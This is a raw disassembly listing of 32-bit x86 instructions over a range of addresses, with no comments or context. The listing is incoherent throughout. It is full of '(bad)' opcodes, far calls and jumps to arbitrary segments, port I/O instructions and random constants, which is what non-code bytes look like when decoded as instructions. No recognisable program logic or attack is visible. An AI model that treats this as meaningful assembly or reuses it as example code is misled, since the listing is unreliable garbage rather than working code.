  42417f:	rol    BYTE PTR fs:[eax],cl
  424182:	pop    ebp
  424183:	int    0x62
  424185:	sub    al,0x1a
  424187:	inc    ebx
  424188:	mov    cl,0x58
  42418a:	or     BYTE PTR [ebx],dh
  42418c:	loop   0x42415c
  42418e:	push   0xffffffcc
  424190:	mov    dl,0x9e
  424192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424193:	mov    dh,BYTE PTR [esp+esi*4+0x69227f55]
  42419a:	shr    DWORD PTR [eax],cl
  42419c:	xchg   ecx,eax
  42419d:	push   0xa7ef39d8
  4241a2:	fnstenv [ebp+0x116b092d]
  4241a8:	imul   esi,DWORD PTR [edi+0xd],0x81458912
  4241af:	(bad)  
  4241b0:	scas   eax,DWORD PTR es:[edi]
  4241b1:	adc    al,0xac
  4241b3:	xchg   ecx,eax
  4241b4:	lahf   
  4241b5:	dec    edx
  4241b6:	call   0x11d5:0x7e658a7a
  4241bd:	jbe    0x4241e7
  4241bf:	mov    dl,0x9e
  4241c1:	scas   eax,DWORD PTR es:[edi]
  4241c2:	inc    ecx
  4241c3:	xlat   BYTE PTR ds:[ebx]
  4241c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241c5:	neg    DWORD PTR [ecx-0x497a2e7e]
  4241cb:	add    cl,bh
  4241cd:	xlat   BYTE PTR ds:[ebx]
  4241ce:	adc    DWORD PTR [edx],esi
  4241d0:	xchg   DWORD PTR [ebp+0x6e689f99],ebp
  4241d6:	pop    edi
  4241d7:	add    eax,0x609bdbc6
  4241dc:	adc    esp,DWORD PTR [edi]
  4241de:	xchg   ecx,eax
  4241df:	push   eax
  4241e0:	xor    cl,BYTE PTR [eax]
  4241e2:	movntps XMMWORD PTR [ecx+0x5d],xmm5
  4241e6:	gs sti 
  4241e8:	jecxz  0x4241df
  4241ea:	test   BYTE PTR [edi+0x5a02732f],al
  4241f0:	in     al,dx
  4241f1:	mov    edx,0xf298d9aa
  4241f6:	pop    es
  4241f7:	mov    ebp,DWORD PTR [ebx+0xb]
  4241fa:	inc    BYTE PTR [edi]
  4241fc:	mov    ds:0x70d46959,eax
  424201:	xchg   DWORD PTR [eax+0x30f4b56c],esi
  424207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424208:	shl    BYTE PTR ds:0x3fe066f3,0x10
  42420f:	mov    esi,0x634a6e6d
  424214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424215:	in     al,dx
  424216:	mov    ds:0xee5ddfa7,eax
  42421b:	cmp    edx,DWORD PTR [edx]
  42421d:	xor    DWORD PTR [eax+0x4f46d72b],edi
  424223:	pop    esi
  424224:	mov    esi,DWORD PTR [eax+ebx*1]
  424227:	imul   edx,DWORD PTR [edi+0x718ebf5],0xd67f1d02
  424231:	sub    eax,DWORD PTR [edx]
  424233:	rol    DWORD PTR [edi],0xa7
  424236:	test   BYTE PTR [ebp+0x4826946],0x83
  42423d:	sub    al,0xd4
  42423f:	mov    ecx,0xe7f2f9b
  424244:	cdq    
  424245:	dec    edi
  424246:	jo     0x424234
  424248:	adc    esp,ebx
  42424a:	and    eax,0xf6dd27f7
  42424f:	cmp    eax,0xde286904
  424254:	(bad)
  424257:	pop    esp
  424258:	aaa    
  424259:	xor    DWORD PTR [eax-0x37ce715e],ebx
  42425f:	cld    
  424260:	cmp    dh,BYTE PTR [esi]
  424262:	retf   
  424263:	inc    edi
  424264:	jmp    0xd5830513
  424269:	(bad)  
  42426a:	mov    al,0x83
  42426c:	and    DWORD PTR [esi],esp
	...
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	jmp    0x67907507
  4242e7:	test   BYTE PTR [ecx],al
  4242e9:	add    BYTE PTR [eax],al
  4242eb:	add    DWORD PTR [eax],eax
  4242ed:	add    BYTE PTR [esi],ah
  4242ef:	dec    esi
  4242f0:	fiadd  WORD PTR [esp+ecx*8+0x7c]
  4242f4:	popf   
  4242f5:	inc    edx
  4242f6:	mov    al,ds:0x8741edce
  4242fb:	push   ds
  4242fc:	adc    cl,BYTE PTR [ecx-0x140db5]
  424302:	test   al,bl
  424304:	pop    eax
  424305:	sub    eax,ebx
  424307:	icebp  
  424308:	rol    DWORD PTR [ecx-0x2f],cl
  42430b:	(bad)  
  42430c:	jns    0x4242c1
  42430e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42430f:	dec    ebp
  424310:	push   eax
  424311:	daa    
  424312:	xchg   DWORD PTR [ebp+0x7d60969],ebx
  424318:	imul   ecx,DWORD PTR [ecx+ecx*1+0x20],0x73
  42431d:	sub    DWORD PTR [edi-0x77d2ef54],edx
  424323:	test   al,0x30
  424325:	xchg   ecx,eax
  424326:	push   ecx
  424327:	gs add bl,al
  42432a:	and    DWORD PTR [eax-0x7a],0xffffffa2
  42432e:	sbb    ebp,0x2e12d42
  424334:	shl    ecx,cl
  424336:	call   0x9b0f:0xcdacdfb7
  42433d:	retf   0x65e3
  424340:	pop    esp
  424341:	out    dx,eax
  424342:	and    BYTE PTR [edi],0xa0
  424345:	fst    DWORD PTR [esi-0x1f]
  424348:	xor    eax,0x6dc8f30b
  42434d:	int3   
  42434e:	test   eax,0xe442a719
  424353:	jae    0x4242df
  424355:	mov    ebx,ebx
  424357:	je     0x4243b3
  424359:	ficom  WORD PTR [ecx]
  42435b:	test   al,0xf0
  42435d:	adc    BYTE PTR [eax],dh
  42435f:	and    DWORD PTR [esi+eax*8-0x3661457e],0xf3a79fa6
  42436a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42436b:	cmp    DWORD PTR [eax+0x77],0x5
  42436f:	in     eax,0xdc
  424371:	add    dl,bh
  424373:	and    BYTE PTR [edi-0x54],dh
  424376:	cwde   
  424377:	and    ch,0xea
  42437a:	loopne 0x4243f9
  42437c:	repz pop edx
  42437e:	mov    al,BYTE PTR [eax]
  424380:	(bad)  
  424381:	rol    al,cl
  424383:	iret   
  424384:	push   ss
  424385:	mov    ecx,0xca37db20
  42438a:	dec    esi
  42438b:	jge    0x424370
  42438d:	cmc    
  42438e:	xchg   edx,eax
  42438f:	stc    
  424390:	into   
  424391:	mov    ecx,0x29a353
  424396:	call   0x32c5:0x5c2254d4
  42439d:	lds    ebx,FWORD PTR [ecx+edi*4-0x6c]
  4243a1:	xor    cl,BYTE PTR [ecx+0x4c]
  4243a4:	out    dx,eax
  4243a5:	jnp    0x4243f8
  4243a7:	test   al,dl
  4243a9:	retf   
  4243aa:	push   ds
  4243ab:	pop    edi
  4243ac:	inc    esp
  4243ad:	push   DWORD PTR [edi-0x76]
  4243b0:	dec    eax
  4243b1:	loopne 0x4243ed
  4243b3:	push   esp
  4243b4:	mov    bl,0x27
  4243b6:	cmp    al,0x68
  4243b8:	fdiv   st(1),st
  4243ba:	jmp    0x424388
  4243bc:	in     al,dx
  4243bd:	ss push ecx
  4243bf:	es inc edi
  4243c1:	jae    0x4243db
  4243c3:	push   eax
  4243c4:	(bad)  
  4243c5:	jbe    0x4243a8
  4243c7:	in     eax,0x67
  4243c9:	inc    esi
  4243ca:	or     al,0xdf
  4243cc:	xor    eax,edx
  4243ce:	scas   eax,DWORD PTR es:[edi]
  4243cf:	aam    0x62
  4243d1:	icebp  
  4243d2:	sti    
  4243d3:	aad    0x56
  4243d5:	lahf   
  4243d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243d7:	ja     0x4243f4
  4243d9:	push   esp
  4243da:	mov    bl,0x5b
  4243dc:	pop    ebx
  4243dd:	cmp    eax,0x52a1a84b
  4243e2:	stos   BYTE PTR es:[edi],al
  4243e3:	mov    al,0x34
  4243e5:	mov    BYTE PTR [esi+0x29],bh
  4243e8:	mov    esp,0xe1369d24
  4243ed:	xor    al,BYTE PTR [eax]
	...
  424453:	add    BYTE PTR [eax],al
  424455:	add    BYTE PTR [edx-0x24582da],cl
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x42449b
  424463:	scas   al,BYTE PTR es:[edi]
  424464:	scas   al,BYTE PTR es:[edi]
  424465:	sub    al,0x67
  424467:	test   DWORD PTR [ecx],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    ah,ch
  42446f:	aas    
  424470:	(bad)  
  424471:	jmp    0x4244cc
  424473:	(bad)  
  424474:	mov    edx,0xd9faf8ca
  424479:	out    0x81,al
  42447b:	fisttp DWORD PTR [edi-0x269c8db4]
  424481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424482:	xlat   BYTE PTR ds:[ebx]
  424483:	add    eax,0x9c2029ba
  424488:	test   BYTE PTR [ecx],0x13
  42448b:	add    eax,0x639addad
  424490:	xor    esp,DWORD PTR [edi+0x2c]
  424493:	or     DWORD PTR [edi],esp
  424495:	(bad)  [eax-0xf]
  424498:	adc    edi,DWORD PTR [ecx-0x35]
  42449b:	lahf   
  42449c:	stc    
  42449d:	popa   
  42449e:	sub    BYTE PTR [esp+ebx*8-0x2],ch
  4244a2:	or     ebp,DWORD PTR [edi]
  4244a4:	je     0x4244bb
  4244a6:	or     ah,bl
  4244a8:	jne    0x4244d3
  4244aa:	or     bh,BYTE PTR [edi]
  4244ac:	jle    0x4244a5
  4244ae:	loope  0x424454
  4244b0:	xor    DWORD PTR [ebx],0xb6a02957
  4244b6:	mov    ecx,0xb919be34
  4244bb:	sub    edx,ebx
  4244bd:	mov    cl,ch
  4244bf:	loopne 0x4244b9
  4244c1:	adc    eax,DWORD PTR [ebx-0x4e]
  4244c4:	push   ebp
  4244c5:	mov    esp,0x5d982f04
  4244ca:	ror    BYTE PTR [ecx+0x26],0xc3
  4244ce:	enter  0x5c91,0x69
  4244d2:	jae    0x424475
  4244d4:	fs test eax,0xd9cb79d7
  4244db:	out    0x25,eax
  4244dd:	ret    
  4244de:	das    
  4244df:	jp     0x42450d
  4244e1:	push   edx
  4244e2:	push   ss
  4244e3:	push   ds
  4244e4:	adc    ecx,DWORD PTR [edi+0x51a945f4]
  4244ea:	pop    eax
  4244eb:	test   al,0xf9
  4244ed:	jl     0x42456c
  4244ef:	pop    esi
  4244f0:	jmp    0x84be:0xb12ce1af
  4244f7:	rcr    DWORD PTR [esi],1
  4244f9:	push   esp
  4244fa:	mov    esi,0xa06edfb7
  4244ff:	pop    ss
  424500:	ja     0x4244bf
  424502:	cmc    
  424503:	jbe    0x424568
  424505:	idiv   BYTE PTR [eax+0x4d]
  424508:	mov    edx,0x732a62ee
  42450d:	or     al,0xb3
  42450f:	cwde   
  424510:	pop    edi
  424511:	cmc    
  424512:	test   DWORD PTR [esi],edi
  424514:	(bad)  
  424515:	inc    esi
  424516:	data16 rol BYTE PTR [ebx],0xb9
  42451a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42451b:	test   DWORD PTR [eax+0x17],ebx
  42451e:	in     al,0xa1
  424520:	xlat   BYTE PTR ds:[ebx]
  424521:	pusha  
  424522:	in     al,0x32
  424524:	mov    ebp,0x1a01e55f
  424529:	in     eax,0xcd
  42452b:	(bad)  
  42452c:	jp     0x424523
  42452e:	ja     0x4244bd
  424530:	pop    ebx
  424531:	fimul  WORD PTR [esi-0xb04a003]
  424537:	dec    ebx
  424538:	imul   edi,DWORD PTR [ebx+ebx*2],0xf799cf76
  42453f:	repz xchg esp,eax
  424541:	out    0x9d,al
  424543:	mov    al,ds:0xb0f13a2d
  424548:	and    al,0xaa
  42454a:	mov    ebx,0xae7973e1
  42454f:	cmc    
  424550:	pop    es
  424551:	cmp    cl,BYTE PTR [edi]
  424553:	push   esp
  424554:	mov    edx,0xa6877bb5
  424559:	xor    al,0x77
  42455b:	adc    dh,dh
  42455d:	dec    edx
  42455f:	js     0x4245a5
  424561:	inc    ebx
  424562:	pop    edx
  424563:	ret    
  424564:	shl    bh,1
  424566:	loopne 0x424595
  424568:	call   0xeb:0xbf00edca
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x46],1
  4245e3:	push   edi
  4245e4:	sub    esi,DWORD PTR [edx+0x18667]
  4245ea:	add    BYTE PTR [ecx],al
  4245ec:	add    BYTE PTR [eax],al
  4245ee:	aas    
  4245ef:	std    
  4245f0:	lea    esi,[edi-0x6f]
  4245f3:	lods   al,BYTE PTR ds:[esi]
  4245f4:	mov    cl,0x3c
  4245f6:	rcl    BYTE PTR [ecx-0x184b0aa7],1
  4245fc:	jnp    0x4245dc
  4245fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245ff:	mov    al,0xed
  424601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424602:	lea    edx,[esi+0x72]
  424605:	jge    0x4245bf
  424607:	push   esi
  424608:	shl    BYTE PTR [edi-0x61d5be48],1
  42460e:	std    
  42460f:	jns    0x424664
  424611:	pusha  
  424612:	adc    al,0xd
  424614:	mov    cl,0x67
  424616:	push   ss
  424617:	lods   al,BYTE PTR ds:[esi]
  424618:	adc    BYTE PTR [edx-0x6d],ah
  42461b:	(bad)  
  42461c:	mov    esp,0x15e73903
  424621:	pop    ss
  424622:	ret    0xeb11
  424625:	xor    bh,bl
  424627:	sub    ecx,ebp
  424629:	mov    ebp,0xa3dfaf30
  42462e:	mov    esi,0x67a26190
  424633:	sub    ebx,DWORD PTR [ebx]
  424635:	(bad)  
  424636:	push   ebp
  424637:	ret    
  424638:	dec    edi
  424639:	les    eax,FWORD PTR [eax]
  42463b:	mov    cl,ah
  42463d:	mov    cl,0xd9
  42463f:	lea    edx,[eax-0x59f7434e]
  424645:	cmp    edx,edx
  424647:	repnz add cl,BYTE PTR [edx-0xf04d8e4]
  42464e:	ror    BYTE PTR [eax-0x40],cl
  424651:	popa   
  424652:	mov    eax,ds:0x8bf673e0
  424657:	pop    es
  424658:	in     eax,0xa4
  42465a:	mov    ds:0x546ff36,al
  42465f:	mov    ds:0x9b764435,al
  424664:	sub    cx,bx
  424667:	push   ecx
  424668:	(bad)  
  42466a:	push   ebx
  42466b:	jo     0x42463b
  42466d:	aaa    
  42466e:	scas   eax,DWORD PTR es:[edi]
  42466f:	dec    ebp
  424670:	mov    edx,0x26acba7f
  424675:	nop
  424676:	xchg   ebp,eax
  424677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424678:	fnstcw WORD PTR fs:[edi+0xc]
  42467c:	jae    0x4246bf
  42467e:	je     0x424677
  424680:	and    ebx,0xffffff96
  424683:	inc    ebx
  424684:	pop    ebp
  424685:	push   0xffffffdb
  424687:	lds    ebx,FWORD PTR [edx]
  424689:	fldcw  WORD PTR [ecx-0x19]
  42468c:	cwde   
  42468d:	add    eax,0x5d52e3b3
  424692:	outs   dx,BYTE PTR cs:[esi]
  424694:	shl    BYTE PTR [esi-0x30725a5f],0x35
  42469b:	jnp    0x4246dc
  42469d:	mov    dh,0x6
  42469f:	sub    eax,0xdcd4c282
  4246a4:	das    
  4246a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246a6:	aad    0xb0
  4246a8:	popa   
  4246a9:	cmp    cl,BYTE PTR [edi+0x2a]
  4246ac:	push   es
  4246ad:	repz pop ebx
  4246af:	jle    0x4246c4
  4246b1:	out    0xb9,eax
  4246b3:	mov    dh,0xc2
  4246b5:	xchg   ebp,eax
  4246b6:	inc    eax
  4246b7:	xor    edx,DWORD PTR [edi+0x79feb906]
  4246bd:	push   ss
  4246be:	or     edx,esp
  4246c0:	adc    al,0xf0
  4246c2:	in     al,0xc7
  4246c4:	(bad)  
  4246c5:	cvtps2pi mm3,xmm5
  4246c8:	outs   dx,BYTE PTR ds:[esi]
  4246c9:	js     0x424717
  4246cb:	xor    esp,DWORD PTR [ebp+esi*8+0x10]
  4246cf:	(bad)  
  4246d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246d2:	sbb    eax,0xd267fa8d
  4246d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246d8:	mov    eax,ds:0xd9939ecc
  4246dd:	xchg   BYTE PTR [edx-0x31],bh
  4246e0:	imul   edi,DWORD PTR ds:0x9167e995,0x51
  4246e7:	cmp    al,0x3
  4246e9:	ret    
  4246ea:	or     edx,esi
  4246ec:	inc    ecx
  4246ed:	xchg   esi,eax
	...
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    ch,dl
  424763:	stos   DWORD PTR es:[edi],eax
  424764:	cmp    cl,BYTE PTR [edx+0x18767]
  42476a:	add    BYTE PTR [ecx],al
  42476c:	add    BYTE PTR [eax],al
  42476e:	nop
  42476f:	mov    dl,BYTE PTR [ecx+0x77]
  424772:	pop    edx
  424773:	adc    bh,al
  424775:	push   esp
  424776:	dec    esi
  424777:	pop    esi
  424778:	pop    es
  424779:	mov    edx,0x31c86173
  42477e:	(bad)  
  42477f:	shl    BYTE PTR [edi],1
  424781:	aaa    
  424782:	mov    ch,0x73
  424784:	in     al,0xc0
  424786:	jmp    0x424802
  424788:	jl     0x424775
  42478a:	jl     0x4247cf
  42478c:	enter  0xcd16,0xf8
  424790:	je     0x424762
  424792:	test   si,ax
  424795:	mov    ecx,0x16546e18
  42479a:	or     edi,DWORD PTR [ecx]
  42479c:	mov    edi,0x71269070
  4247a1:	cwde   
  4247a2:	loopne 0x4247dc
  4247a4:	inc    ebp
  4247a5:	stos   BYTE PTR es:[edi],al
  4247a6:	fldenv [ecx]
  4247a8:	inc    ebx
  4247a9:	es push esi
  4247ab:	mov    ebp,0xcffe3a58
  4247b0:	jno    0x42474d
  4247b2:	add    al,0x1a
  4247b4:	pop    esp
  4247b5:	mov    ds:0xc38ef3c2,al
  4247ba:	aam    0xb6
  4247bc:	sub    al,0xd6
  4247bf:	dec    ebx
  4247c0:	cs call 0xcb1109d4
  4247c6:	add    esp,ecx
  4247c8:	mov    edi,0x3b346b4c
  4247ce:	push   esi
  4247cf:	cmp    ch,BYTE PTR [edx-0x64]
  4247d2:	outs   dx,BYTE PTR ds:[esi]
  4247d3:	push   0xa9098563
  4247d8:	clc    
  4247d9:	jmp    0x424773
  4247db:	out    dx,al
  4247dc:	adc    eax,0xd73a9071
  4247e1:	ror    BYTE PTR [eax],cl
  4247e3:	xlat   BYTE PTR ds:[ebx]
  4247e4:	mov    ah,0x85
  4247e6:	or     DWORD PTR [eax-0x7e],0x1b6822ae
  4247ed:	push   ss
  4247ee:	fbld   TBYTE PTR [ecx]
  4247f0:	test   bl,ah
  4247f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247f3:	push   es
  4247f4:	inc    ebp
  4247f5:	in     eax,0x91
  4247f7:	fwait
  4247f8:	pop    edi
  4247f9:	push   cs
  4247fa:	retf   
  4247fb:	lea    edx,[edi+0x7a]
  4247fe:	xchg   ebx,eax
  4247ff:	loope  0x424809
  424801:	(bad)  
  424802:	lods   al,BYTE PTR ds:[esi]
  424803:	jle    0x4247a2
  424805:	loope  0x424853
  424807:	sub    al,0x3e
  424809:	adc    eax,0x85a9e572
  42480e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42480f:	push   eax
  424810:	in     eax,0x41
  424812:	(bad)  
  424813:	lods   al,BYTE PTR ds:[esi]
  424814:	scas   al,BYTE PTR es:[edi]
  424815:	jb     0x4247e6
  424817:	pop    esi
  424818:	jmp    0x424886
  42481a:	inc    eax
  42481b:	ss jecxz 0x424807
  42481e:	and    edi,DWORD PTR [ebx-0x2487f0a2]
  424824:	mov    ecx,0x9e98ed5e
  424829:	mov    dl,0x6c
  42482b:	cmp    esp,DWORD PTR [ecx+0x3c]
  42482e:	add    esp,eax
  424830:	daa    
  424831:	mov    ah,0xcb
  424833:	enter  0xf230,0x48
  424837:	aam    0x50
  424839:	add    BYTE PTR ds:0xa791b535,ch
  42483f:	icebp  
  424840:	call   0x6863:0x3407c9c4
  424847:	pop    esi
  424848:	lahf   
  424849:	sbb    DWORD PTR [edx+0x3a149374],esp
  42484f:	test   BYTE PTR [edx+esi*1-0x6e],bh
  424853:	pusha  
  424854:	push   ebp
  424855:	sub    bh,ah
  424857:	pushf  
  424858:	(bad)  
  424859:	out    dx,eax
  42485a:	adc    eax,0xd6d9d653
  42485f:	inc    esi
  424860:	ret    0xee4c
  424863:	js     0x4247f0
  424865:	inc    ebx
  424866:	imul   ebx,DWORD PTR [edx+edi*1],0x3acd5799
  42486d:	outs   dx,BYTE PTR ds:[esi]
	...
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	cmp    bl,BYTE PTR [edi+0x44]
  4248e5:	inc    ecx
  4248e6:	mov    BYTE PTR [bx+di],al
  4248e9:	add    BYTE PTR [eax],al
  4248eb:	add    DWORD PTR [eax],eax
  4248ed:	add    BYTE PTR [esi-0x75550afb],ah
  4248f3:	inc    ebp
  4248f4:	adc    edx,DWORD PTR [esi-0x660faf4d]
  4248fa:	test   DWORD PTR [edx+0x13],edx
  4248fd:	mov    ah,0x2d
  4248ff:	dec    edx
  424900:	sub    eax,0xfb79ad34
  424905:	mov    edi,0xc25b1e8c
  42490a:	out    dx,al
  42490b:	inc    esi
  42490c:	pop    ecx
  42490d:	xchg   esi,eax
  42490e:	cld    
  42490f:	stc    
  424910:	cmc    
  424911:	adc    al,0x6c
  424913:	shl    dl,1
  424915:	test   BYTE PTR [ebp-0x68],0xe8
  424919:	popf   
  42491a:	retf   
  42491b:	aad    0x36
  42491d:	dec    esi
  42491e:	outs   dx,DWORD PTR ds:[esi]
  42491f:	inc    edi
  424920:	sti    
  424921:	jo     0x4248c1
  424923:	jo     0x4248f8
  424925:	lock push edx
  424927:	mov    bh,0xe7
  424929:	scas   al,BYTE PTR es:[edi]
  42492a:	shr    dl,0xa1
  42492d:	in     al,dx
  42492e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42492f:	sbb    DWORD PTR [edi-0x3d232fca],ebp
  424935:	add    ebx,DWORD PTR [eax-0x43c6125d]
  42493b:	mov    ebp,0xdc93bba4
  424940:	inc    esi
  424941:	mov    ?,ecx
  424943:	(bad)  
  424946:	pop    edi
  424947:	jns    0x42491e
  424949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42494a:	jnp    0x42494e
  42494c:	imul   edi,DWORD PTR [esi],0xe5760977
  424952:	in     eax,dx
  424953:	imul   ebx,DWORD PTR [esi-0x25d13c80],0x4e4e72ff
  42495d:	add    edi,DWORD PTR [eax]
  42495f:	es jmp 0x7462354f
  424965:	test   eax,0x8a5c82dc
  42496a:	sbb    al,0x4c
  42496c:	mov    edi,0x431fea13
  424971:	js     0x4249c2
  424973:	enter  0x9406,0xbb
  424977:	aam    0xb0
  424979:	stos   DWORD PTR es:[edi],eax
  42497a:	push   ds
  42497b:	dec    ebp
  42497c:	nop
  42497d:	adc    al,0x81
  42497f:	xchg   edi,eax
  424980:	das    
  424981:	sub    BYTE PTR [ebx],dl
  424983:	cs and al,0xf0
  424986:	push   ds
  424987:	inc    esp
  424988:	cmp    eax,0xf3307f72
  42498d:	push   ecx
  42498e:	call   0x690a89fb
  424993:	in     eax,dx
  424994:	imul   ebp,DWORD PTR [edi-0x3c],0x5a410aa8
  42499b:	dec    esi
  42499c:	and    BYTE PTR [esi-0x7d888867],cl
  4249a2:	pop    ss
  4249a3:	test   edx,ecx
  4249a5:	icebp  
  4249a6:	pop    edi
  4249a7:	xchg   BYTE PTR [eax+0x2d4f809d],cl
  4249ad:	sar    BYTE PTR [esi],0x5a
  4249b0:	mov    cl,0xf1
  4249b2:	out    0x29,al
  4249b4:	in     eax,0xb0
  4249b6:	scas   al,BYTE PTR es:[edi]
  4249b7:	into   
  4249b8:	xchg   esp,eax
  4249b9:	mov    eax,0x88ab7b3
  4249be:	fxtract 
  4249c0:	sbb    bl,BYTE PTR [ecx+edx*2]
  4249c3:	mov    cl,0xdf
  4249c5:	rol    DWORD PTR [eax+0x58c3f15a],0x2e
  4249cc:	jae    0x4249a3
  4249ce:	scas   eax,DWORD PTR es:[edi]
  4249cf:	jl     0x4249cb
  4249d1:	in     eax,dx
  4249d2:	xchg   BYTE PTR [esi-0x31],al
  4249d5:	sub    BYTE PTR [edi-0x43c6919d],bl
  4249db:	dec    ebx
  4249dc:	add    al,0xc2
  4249de:	jno    0x4249f7
  4249e0:	jno    0x42496b
  4249e2:	out    0x3a,al
  4249e4:	push   ecx
  4249e5:	jo     0x4249f5
  4249e7:	mov    esi,0xcfeee30c
  4249ec:	fstp   QWORD PTR [esi]
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    cl,bl
  424a63:	iret   
  424a64:	std    
  424a65:	push   esi
  424a66:	mov    DWORD PTR [bx+di],eax
  424a69:	add    BYTE PTR [eax],al
  424a6b:	add    DWORD PTR [eax],eax
  424a6d:	add    BYTE PTR [edx+0x24],al
  424a70:	sub    cl,BYTE PTR ds:0xefe2a1a0
  424a76:	inc    ebx
  424a77:	ins    BYTE PTR es:[edi],dx
  424a78:	sbb    edx,DWORD PTR [eax]
  424a7a:	sbb    ebx,DWORD PTR [esi]
  424a7c:	jecxz  0x424a92
  424a7e:	sub    ebp,0xe4b4eec5
  424a84:	pop    esi
  424a85:	ins    DWORD PTR es:[edi],dx
  424a86:	aad    0x41
  424a88:	sub    edi,DWORD PTR [eax+0x53]
  424a8b:	adc    al,BYTE PTR [ebx]
  424a8d:	sub    eax,0x5838e5f5
  424a92:	push   0x7eaf3879
  424a97:	sub    dh,ch
  424a99:	fiadd  WORD PTR [edx]
  424a9b:	mov    WORD PTR [eax],ds
  424a9d:	call   0x776fea08
  424aa2:	or     al,BYTE PTR [ebp+0x3cc0dd71]
  424aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424aa9:	(bad)  
  424aaa:	aad    0xbd
  424aac:	js     0x424a35
  424aae:	cmp    BYTE PTR [eax+eax*8+0x59136f33],cl
  424ab5:	shr    DWORD PTR [edi-0x36],cl
  424ab8:	and    al,0xde
  424aba:	add    ecx,0x9
  424abd:	ror    DWORD PTR [edx-0x53],cl
  424ac0:	mov    ebp,DWORD PTR [edx+0x35b71d0d]
  424ac6:	and    al,0x11
  424ac8:	sbb    bh,BYTE PTR [ebx+eax*4-0x1b]
  424acc:	lods   eax,DWORD PTR ds:[esi]
  424acd:	stc    
  424ace:	pushf  
  424acf:	retf   0x35ea
  424ad2:	clc    
  424ad3:	push   ds
  424ad4:	test   DWORD PTR [edx+0x640d666d],ebx
  424ada:	and    BYTE PTR [edi-0x3],0x5b
  424ade:	push   edi
  424adf:	addr16 pop ecx
  424ae1:	xor    eax,0xd38e496b
  424ae6:	sub    esi,DWORD PTR [eax]
  424ae8:	mov    dl,0xd6
  424aea:	jne    0x424aa7
  424aec:	mov    dh,0x9f
  424aee:	ins    DWORD PTR es:[edi],dx
  424aef:	and    eax,0xbad67429
  424af4:	imul   eax,DWORD PTR [eax-0x1e531013],0x5f33cd8c
  424afe:	cmp    BYTE PTR [edx],bl
  424b00:	fnstcw WORD PTR ds:0xd97843b2
  424b07:	mov    ds:0x2ae6c084,al
  424b0c:	jns    0x424ab9
  424b0e:	es in  al,dx
  424b10:	popf   
  424b11:	mov    DWORD PTR [esi],esp
  424b13:	and    al,0x61
  424b15:	push   es
  424b16:	push   ecx
  424b17:	gs dec eax
  424b19:	cmc    
  424b1a:	nop
  424b1b:	dec    esi
  424b1c:	enter  0x64e,0x88
  424b20:	idiv   ebp
  424b22:	lock int 0x7e
  424b25:	push   ds
  424b26:	cdq    
  424b27:	(bad)  
  424b28:	cmp    ch,BYTE PTR [edi]
  424b2a:	dec    WORD PTR [ebx+ecx*1]
  424b2e:	mov    esp,0x8879b99b
  424b33:	sub    dh,al
  424b35:	jmp    0x5ab4:0x1f2469f0
  424b3c:	push   ecx
  424b3d:	cwde   
  424b3e:	and    bl,cl
  424b40:	jnp    0x424b60
  424b42:	xor    dh,BYTE PTR [edx+0x1fcd1af6]
  424b48:	in     al,dx
  424b49:	sub    eax,edi
  424b4b:	(bad)  
  424b4c:	sti    
  424b4d:	mov    esp,0x32fe2552
  424b52:	mov    ebp,0xdeeff756
  424b57:	mov    al,ds:0xb8eb2383
  424b5c:	adc    BYTE PTR [ecx],bl
  424b5e:	in     eax,0x43
  424b60:	outs   dx,BYTE PTR ds:[esi]
  424b61:	inc    DWORD PTR [edi+edx*1+0x62db09cf]
  424b68:	sbb    DWORD PTR ds:0xfd06d01c,0x0
	...
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	fistp  WORD PTR [edx]
  424be4:	xchg   ebp,eax
  424be5:	loope  0x424c4e
  424be7:	mov    al,BYTE PTR [ecx]
  424be9:	add    BYTE PTR [eax],al
  424beb:	add    DWORD PTR [eax],eax
  424bed:	add    BYTE PTR [edx-0x6039a69b],cl
  424bf3:	dec    edx
  424bf4:	outs   dx,DWORD PTR ds:[esi]
